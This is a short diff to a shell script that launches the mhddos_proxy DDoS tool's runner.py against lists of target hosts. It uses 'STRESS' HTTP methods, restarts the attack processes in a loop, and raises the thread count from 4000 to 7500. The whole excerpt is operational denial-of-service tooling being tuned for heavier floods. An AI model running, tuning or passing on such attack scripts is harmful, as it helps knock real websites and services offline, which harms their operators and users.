@@ -38,8 +38,6 @@ export methods="--http-methods GET STRESS"
 #     export threads="-t 5000"
 # fi
 
-export proxy_threads="2000"
-
 # if [[ $t_proxy_manual != "on" ]]; then
 #     export proxy_threads="2000"
 # fi
@@ -208,7 +206,7 @@ while true; do
     pkill -f start.py; pkill -f runner.py 
     if [[ $lite == "on" ]]; then
         tail -n 2000 $targets_uniq > $targets_lite
-        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 4000 &
+        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 7500 &
     else
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $methods $args_to_pass &
         sleep 5 # to decrease load on cpu during simultaneous start
